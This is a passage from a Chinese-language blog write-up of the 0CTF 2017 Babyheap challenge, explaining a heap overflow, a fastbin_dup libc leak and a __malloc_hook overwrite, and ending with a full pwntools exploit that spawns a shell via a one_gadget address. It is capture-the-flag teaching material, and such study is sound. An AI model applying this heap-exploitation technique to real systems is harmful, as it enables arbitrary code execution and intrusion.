<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x50</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
</tbody>
</table>
<p>然后在bin中有一处很明显的漏洞，fill函数中输入的数据长度是在fill函数中由你输入的，而不是你malloc的长度，所以这里就存在堆溢出，比如我malloc(0x10)，但是我fill却可以输入0x30的数据。</p>
<p>利用这个方法，我们可以通过fill(0)，从而修改0x30地址的第一个byte，修改成0x60，payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></div><div class="line">payload += p64(<span class="number">0x21</span>)</div><div class="line">payload += p8(<span class="number">0x60</span>)</div></pre></td></tr></table></figure>
<p>这样我们再malloc(0x10)，获取到了0x20，再次malloc(0x10)，并不能获得到0x60，讲fastbin的时候讲过，malloc有check机制，会check长度，因为0x60的长度是0x90，所以会失败。</p>
<p>解决方案也很简单，在free(2)之前，我们先fill(2)，修改成0x21，payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></div><div class="line">payload += p64(<span class="number">0x21</span>)</div></pre></td></tr></table></figure>
<p>这个时候的堆是这样的：</p>
<table>
<thead>
<tr>
<th style="text-align:center">地址</th>
<th style="text-align:center">0-8 byte</th>
<th style="text-align:center">9-f byte</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">id:0/0x00</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x10</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">id:1/0x20</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x30</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">0x40</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x50</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">id:3/id:2/0x60</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
</tbody>
</table>
<p>然后fill(1)，payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></div><div class="line">payload += p64(<span class="number">0x21</span>)</div><div class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></div><div class="line">payload += p64(<span class="number">0x91</span>)</div></pre></td></tr></table></figure>
<p>来修复small chunk的size</p>
<p>这时候就能成功的free(3)</p>
<p>这个时候的堆：</p>
<table>
<thead>
<tr>
<th style="text-align:center">地址</th>
<th style="text-align:center">0-8 byte</th>
<th style="text-align:center">9-f byte</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">id:0/0x00</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x10</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">id:1/0x20</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x30</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">0x40</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x50</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">id:2/0x60</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x91</td>
</tr>
<tr>
<td style="text-align:center">0x70</td>
<td style="text-align:center">fd(*top_chunk)</td>
<td style="text-align:center">bk(*top_chunk)</td>
</tr>
</tbody>
</table>
<p>然后我们再dump(2)，就能获取到libc的地址了</p>
<h2 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc hook"></a>malloc hook</h2><p>这对我来说也是一个新的知识点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/36gx 0x7ffff7dd1b20-0x40</div><div class="line">0x7ffff7dd1ae0 &lt;_IO_wide_data_0+288&gt;:	0x0000000000000000	0x0000000000000000</div><div class="line">0x7ffff7dd1af0 &lt;_IO_wide_data_0+304&gt;:	0x00007ffff7dd0260	0x0000000000000000</div><div class="line">0x7ffff7dd1b00 &lt;__memalign_hook&gt;:	0x00007ffff7a92e20	0x00007ffff7a92a00</div><div class="line">0x7ffff7dd1b10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</div><div class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:	0x0000000100000000	0x0000000000000000</div><div class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</div></pre></td></tr></table></figure>
<p>在arena的上面，有个malloc_hook，当这个地址的值不为0时，我们执行malloc将会先跳到malloc_hook的地址上执行指令</p>
<p>所以这里就有一个思路了，我们把malloc_hook给赋值一个执行shell指令的地址，该地址假设为0x23333</p>
<p>然后我们执行malloc函数，不就可以拿到shell了么</p>
<p>覆盖malloc_hook倒挺简单的，就是通过上面的fastbin_dup方法，malloc出最大是malloc_hook-0x16的地址，然后通过fill来覆盖malloc_hook</p>
<p>这里的唯一问题就是malloc的长度检查，然后fastbin的size范围是0x20-0x80</p>
<p>这个问题也好解决，我们可以看看上面的数据，储存了一些地址，而这些地址的高位都是0x7f，所以我们可以修改偏移，这样:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/10gx 0x7ffff7dd1b20-0x33</div><div class="line">0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:	0xfff7dd0260000000	0x000000000000007f</div><div class="line">0x7ffff7dd1afd:	                        0xfff7a92e20000000	0xfff7a92a0000007f</div><div class="line">0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:	    0x000000000000007f	0x0000000000000000</div><div class="line">0x7ffff7dd1b1d:	                        0x0100000000000000	0x0000000000000000</div><div class="line">0x7ffff7dd1b2d &lt;main_arena+13&gt;:	        0x0000000000000000	0x0000000000000000</div></pre></td></tr></table></figure>
<p>这样，就成功构造了一个有效size</p>
<p>然后我们利用fastbin_dup，达到malloc(0x60)返回改地址的目的，然后把malloc_hook的地址覆盖成0x23333就好了</p>
<p>上面的利用过程我们不需要知道具体的地址，我们只需要知道这个地址和我们之前泄露出来的地址之前的差值就能计算出来该地址了</p>
<h2 id="寻找getshell指令"><a href="#寻找getshell指令" class="headerlink" title="寻找getshell指令"></a>寻找getshell指令</h2><p>我看了别人的wp，发现使用一个<a href="https://github.com/david942j/one_gadget" target="_blank" rel="external">one_gadget</a>工具</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> one_gadget libc.so.6 </span></div><div class="line">0x41374	execve("/bin/sh", rsp+0x30, environ)</div><div class="line">constraints:</div><div class="line">  [rsp+0x30] == NULL</div><div class="line"></div><div class="line">0xbac7d	execve("/bin/sh", rsi, r12)</div><div class="line">constraints:</div><div class="line">  [rsi] == NULL || rsi == NULL</div><div class="line">  [r12] == NULL || r12 == NULL</div><div class="line"></div><div class="line">0xbaccc	execve("/bin/sh", [rbp-0x48], r12)</div><div class="line">constraints:</div><div class="line">  [[rbp-0x48]] == NULL || [rbp-0x48] == NULL</div><div class="line">  [r12] == NULL || r12 == NULL</div><div class="line"></div><div class="line">0xd6e77	execve("/bin/sh", rsp+0x70, environ)</div><div class="line">constraints:</div><div class="line">  [rsp+0x70] == NULL</div><div class="line"></div><div class="line">0xdaa50	execve("/bin/sh", r9, rdx)</div><div class="line">constraints:</div><div class="line">  [r9] == NULL || r9 == NULL</div><div class="line">  [rdx] == NULL || rdx == NULL</div></pre></td></tr></table></figure>
<p>可以找到好几个能getshell的指令</p>
<p>T：那么以前做栈溢出的时候是不是泄露出libc地址后可以直接跳到这个地址了，就不用再自己构造system(‘/bin/sh’)了？下次去试试</p>
<hr>
<p>感觉自己从来就不会Pwn……继续努力学习新姿势</p>
<p>最后附上PoC:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding=utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></div><div class="line">    r.sendline(<span class="string">'1'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(size))</div><div class="line">    r.recvuntil(<span class="string">': '</span>, timeout=<span class="number">5</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx, data)</span>:</span></div><div class="line">    r.sendline(<span class="string">'2'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(len(data)))</div><div class="line">    r.sendafter(<span class="string">': '</span>, data)</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></div><div class="line">    r.sendline(<span class="string">'3'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></div><div class="line">    r.sendline(<span class="string">'4'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.recvuntil(<span class="string">': \n'</span>)</div><div class="line">    data = r.recvline()</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    debug = <span class="number">1</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> debug:</div><div class="line">        context.log_level = <span class="string">"debug"</span></div><div class="line">        r = process(<span class="string">"./test"</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        r = remote(<span class="string">"127.0.0.1"</span>, <span class="number">10000</span>)</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line">    alloc(<span class="number">0x10</span>)</div><div class="line">    alloc(<span class="number">0x10</span>)</div><div class="line">    alloc(<span class="number">0x10</span>)</div><div class="line">    alloc(<span class="number">0x80</span>)</div><div class="line">    alloc(<span class="number">0x80</span>)</div><div class="line"></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">3</span></div><div class="line">    payload += p64(<span class="number">0x21</span>)</div><div class="line">    fill(<span class="number">2</span>, payload)</div><div class="line"></div><div class="line">    free(<span class="number">2</span>)</div><div class="line">    free(<span class="number">1</span>)</div><div class="line"></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">3</span></div><div class="line">    payload += p64(<span class="number">0x21</span>)</div><div class="line">    payload += p8(<span class="number">0x60</span>)</div><div class="line">    fill(<span class="number">0</span>, payload)</div><div class="line"></div><div class="line">    alloc(<span class="number">0x10</span>)</div><div class="line">    alloc(<span class="number">0x10</span>)</div><div class="line"></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">7</span></div><div class="line">    payload += p64(<span class="number">0x91</span>)</div><div class="line">    fill(<span class="number">1</span>, payload)</div><div class="line">    free(<span class="number">3</span>)</div><div class="line"></div><div class="line">    arena_top = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>])</div><div class="line">    log.info(<span class="string">"arena_top_chunk: "</span> + hex(arena_top))</div><div class="line"></div><div class="line">    alloc(<span class="number">0x60</span>)</div><div class="line">    free(<span class="number">3</span>)</div><div class="line"></div><div class="line">    fill(<span class="number">2</span>, p64(arena_top - <span class="number">139</span>))    <span class="comment"># malloc_hook上面的地址</span></div><div class="line">    alloc(<span class="number">0x60</span>)</div><div class="line">    alloc(<span class="number">0x60</span>)</div><div class="line"></div><div class="line">    payload  = <span class="string">'\x00'</span>*<span class="number">3</span></div><div class="line">    payload += p64(<span class="number">0</span>)*<span class="number">2</span></div><div class="line">    payload += p64(arena_top - <span class="number">3556100</span>)  <span class="comment"># getshell的地址</span></div><div class="line">    fill(<span class="number">5</span>, payload)</div><div class="line"></div><div class="line">    alloc(<span class="number">233</span>)</div><div class="line"></div><div class="line">    r.interactive()</div></pre></td></tr></table></figure>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2017/08/01/0x36/">堆溢出学习之0CTF 2017 Babyheap</a></p>
        <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
        <p><span>发布时间:</span>2017-08-01, 22:12:10</p>
        <p><span>最后更新:</span>2017-08-02, 00:49:03</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2017/08/01/0x36/" title="堆溢出学习之0CTF 2017 Babyheap">http://0x48.pw/2017/08/01/0x36/</a>
            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2017/08/01/0x36/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>

            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



    <nav id="article-nav">
        
            <div id="article-nav-newer" class="article-nav-title">
                <a href="/2017/08/07/0x37/">
                    malloc.c源码阅读之__libc_free
                </a>
            </div>
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2017/07/25/0x35/">
                    glibc malloc学习笔记之fastbin🐦
                </a>
            </div>
        
    </nav>

  
</article>

    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#fastbin-dup"><span class="toc-number">1.</span> <span class="toc-text">fastbin_dup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Babyheap"><span class="toc-number">2.</span> <span class="toc-text">Babyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#leak-libc-address"><span class="toc-number">2.1.</span> <span class="toc-text">leak libc address</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#malloc-hook"><span class="toc-number">2.2.</span> <span class="toc-text">malloc hook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#寻找getshell指令"><span class="toc-number">2.3.</span> <span class="toc-text">寻找getshell指令</span></a></li></ol></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-6 i,
        .toc-level-6 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

    <script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
    </script>





    




    <div class="scroll" id="post-nav-button">
        
            <a href="/2017/08/07/0x37/" title="上一篇: malloc.c源码阅读之__libc_free">
                <i class="fa fa-angle-left"></i>
            </a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2017/07/25/0x35/" title="下一篇: glibc malloc学习笔记之fastbin🐦">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/01/17/0x40/">34c3 ctf simpleGC writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/16/0x41/">Pwn学习之house of系列(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/08/0x3F/">CVE-2017-16943 Exim UAF漏洞分析--后续</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/01/0x3E/">CVE-2017-16943 Exim UAF漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/11/0x3D/">CTF PWN题之setbuf的利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/03/0x3C/">看雪CTF 第四题club_pwn writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/30/0x3B/">TP-Link WR941N路由器研究</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/04/0x3A/">Pwnhub 2013的国庆 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/0x39/">HITB CTF 2017 Pwn题研究🙉</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/0x38/">Pwnhub之奇妙的巨蟒 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/07/0x37/">malloc.c源码阅读之__libc_free</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/01/0x36/">堆溢出学习之0CTF 2017 Babyheap</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/25/0x35/">glibc malloc学习笔记之fastbin🐦</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/12/0x34/">对虚拟机进行磁盘扩容🐥</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/23/0x33/">ROP小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/05/0x32/">Triton学习笔记(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/03/0x31/">Triton学习笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/02/0x30/">Triton学习笔记(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/0x2f/">记一次手撸CPython bytecode</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/0x2e/">填坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/14/0x2d/">栈溢出之绕过CANARY保护</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/0x2c/">Linux系统下格式化字符串利用研究</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/0x2b/">Pwnhub之深入敌后writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/06/0x2a/">CVE-2016-6313 随机数预测分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/0x29/">phpmailer RCE 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/28/0x28/">2016 HCTF Crypto 出题总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/0x27/">PWN学习总结之基础栈溢出2</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/03/0x26/">PWN学习总结之基础栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/0x24/">HITCON 2016 Web 总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/12/0x23/">2016 HITCON Crypto -- PAKE(++)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/13/0x22/">php bugs 72663分析(CVE-2016-7124)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/31/0x21/">Cisco ASA RCE 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/0x20/">LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/10/0x1F/">CVE-2016-6174漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/14/0x1E/">三个白帽之火币网2W大挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/27/0x1D/">寻找来自星星的你第二期Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/0x1C/">三个白帽之招聘又开始了，你怕了吗？-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/0x1B/">SCTF Code Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/03/0x1A/">GGCTF的对称密码学</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/17/0x19/">How old are Crypto?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/0x18/">MySQLi-Error Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/0x17/">Python 使用dpkt分析数据包</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/01/0x16/">CRYPTO技能修正</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/21/0x15/">Pentester Lab Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/17/0x14/">0CTF RSA?总结 || RSA学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/15/0x13/">This is AliCTF?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0x12/">0CTF总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/0x11/">unholy Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/14/0x0F/">Nebula Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/0x0E/">12.19网络方向培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/08/0x0D/">HCTF之Black-Eat-Black总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/01/0x0C/">Python 的 BaseHTTPServer模块分析小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/31/0x0B/">10.31新生培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/05/0x09/">不使用select情况下的各种盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/03/0x08/">2015XDCTF低分Web题writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/08/07/0x06/">WeChall Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/22/0x04/">git小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x02/">对于硬盘事件的随想</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x01/">对于这次硬盘坏掉事件小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x00/">跳转到以前的博文</a></li></ul>




    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2015-2018 Hcamael
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
    </div>
</footer>
    </div>
    
<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 4;
                var backgroundimg = "url(/img/bg-xxxx.jpg)".replace(/xxxx/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
            
            
            
            
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

    <script>
        var originTitle = document.title;
        var titleTime;
        document.addEventListener("visibilitychange", function() {
            if (document.hidden) {
                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
                clearTimeout(titleTime);
            }
            else {
                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
                titleTime = setTimeout(function() {
                    document.title = originTitle;
                }, 2000);
            }
        })
    </script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->
</body>
</html>